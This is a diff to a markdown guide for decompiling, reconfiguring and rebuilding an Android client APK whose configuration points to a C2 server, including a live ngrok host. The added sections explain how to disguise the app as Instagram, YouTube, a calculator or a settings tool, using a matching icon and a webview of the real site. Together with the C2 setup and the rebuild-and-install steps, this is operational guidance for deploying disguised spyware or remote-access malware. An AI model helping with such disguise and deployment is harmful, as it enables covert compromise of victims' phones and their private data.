@@ -448,12 +448,71 @@ You can change this to any website to disguise the app:
 
 ---
 
+### Step 3: Change App Icon
+
+The app icon is located at **`res/drawable/icon.png`**:
+
+```bash
+# View current icon
+ls -la CLIENT_decompiled/res/drawable/icon.png
+
+# Replace with your custom icon
+cp /path/to/your/icon.png CLIENT_decompiled/res/drawable/icon.png
+```
+
+#### Icon Requirements
+
+| Property | Requirement |
+|----------|-------------|
+| Format | PNG (transparent background supported) |
+| Size | 192x192 pixels (recommended) |
+| Name | Must be `icon.png` |
+| Location | `res/drawable/icon.png` |
+
+#### Icon Ideas for Disguise
+
+| Disguise As | Icon Source |
+|-------------|-------------|
+| Instagram | Instagram logo PNG |
+| YouTube | YouTube logo PNG |
+| Game | Game app icon |
+| Calculator | Calculator icon |
+| Settings | Gear/settings icon |
+| File Manager | Folder icon |
+
+#### Download Icons
+
+```bash
+# Example: Download a placeholder icon
+curl -o CLIENT_decompiled/res/drawable/icon.png https://via.placeholder.com/192
+
+# Or copy from another APK
+# 1. Decompile another APK
+# 2. Copy its icon to your app
+```
+
+#### Create Icon with ImageMagick (Termux)
+
+```bash
+# Install ImageMagick
+pkg install imagemagick
+
+# Resize an image to icon size
+convert input.png -resize 192x192 CLIENT_decompiled/res/drawable/icon.png
+
+# Create a simple colored icon
+convert -size 192x192 xc:blue CLIENT_decompiled/res/drawable/icon.png
+```
+
+---
+
 ### Configuration Summary
 
 | File | Purpose | Example |
 |------|---------|---------|
 | `assets/connection.json` | C2 Server URL | `{"host": "https://your-app.onrender.com/"}` |
 | `assets/ui.json` | App UI/Disguise | `{"webviewUrl": "https://www.instagram.com"}` |
+| `res/drawable/icon.png` | App Icon | 192x192 PNG image |
 
 ---
 
@@ -466,9 +525,13 @@ sed -i 's|https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/|https://
 # Edit ui.json (Change app disguise)
 sed -i 's|https://www.instagram.com|https://www.youtube.com|g' CLIENT_decompiled/assets/ui.json
 
+# Replace app icon
+cp /path/to/your/icon.png CLIENT_decompiled/res/drawable/icon.png
+
 # Verify changes
 cat CLIENT_decompiled/assets/connection.json
 cat CLIENT_decompiled/assets/ui.json
+ls -la CLIENT_decompiled/res/drawable/icon.png
 ```
 
 ---
@@ -601,7 +664,7 @@ adb install CLIENT_signed.apk
 # 1. Decompile
 apktool d CLIENT_src.apk -o CLIENT_decompiled
 
-# 2. Edit config files in assets/
+# 2. Edit config files
 # Server URL:
 nano CLIENT_decompiled/assets/connection.json
 # {"host": "https://your-app.onrender.com/"}
@@ -610,12 +673,16 @@ nano CLIENT_decompiled/assets/connection.json
 nano CLIENT_decompiled/assets/ui.json
 # {"webviewUrl": "https://www.instagram.com"}
 
-# Or use sed for quick replace:
+# App Icon (optional):
+cp /path/to/your/icon.png CLIENT_decompiled/res/drawable/icon.png
+
+# Or use sed for quick URL replace:
 sed -i 's|https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/|https://your-app.onrender.com/|g' CLIENT_decompiled/assets/connection.json
 
 # 3. Verify changes
 cat CLIENT_decompiled/assets/connection.json
 cat CLIENT_decompiled/assets/ui.json
+ls -la CLIENT_decompiled/res/drawable/icon.png
 
 # 4. Rebuild
 apktool b CLIENT_decompiled -o CLIENT_modified.apk
@@ -640,6 +707,7 @@ CLIENT_src.apk
 ├── classes.dex              # Compiled Dalvik bytecode
 ├── res/                     # Resources (layouts, images, strings)
 │   ├── drawable/            # Images
+│   │   └── icon.png         # ⚡ APP ICON (REPLACE THIS!)
 │   ├── layout/              # UI layouts
 │   └── values/              # Strings, colors, styles
 ├── assets/                  # Raw files (configs, databases)
